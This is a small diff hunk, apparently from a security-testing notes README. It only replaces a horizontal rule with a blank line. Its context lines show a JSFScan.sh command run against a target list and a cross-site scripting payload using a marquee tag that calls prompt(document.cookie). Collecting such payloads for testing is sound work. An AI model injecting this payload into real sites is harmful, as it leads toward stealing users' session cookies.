@@ -455,7 +455,7 @@ bash JSFScan.sh -l targets.txt --all -r -o filname
 "><u>Xalgord</u><marquee onstart='prompt(document.cookie)';>XSS</marquee>
 ```
 
-***
+
 
 ![Screenshot\_2021-03-16-16-34-20-695\_com google android youtube](https://user-images.githubusercontent.com/48483027/111305580-284b7580-867d-11eb-8704-dee84bb789e9.jpg)
 
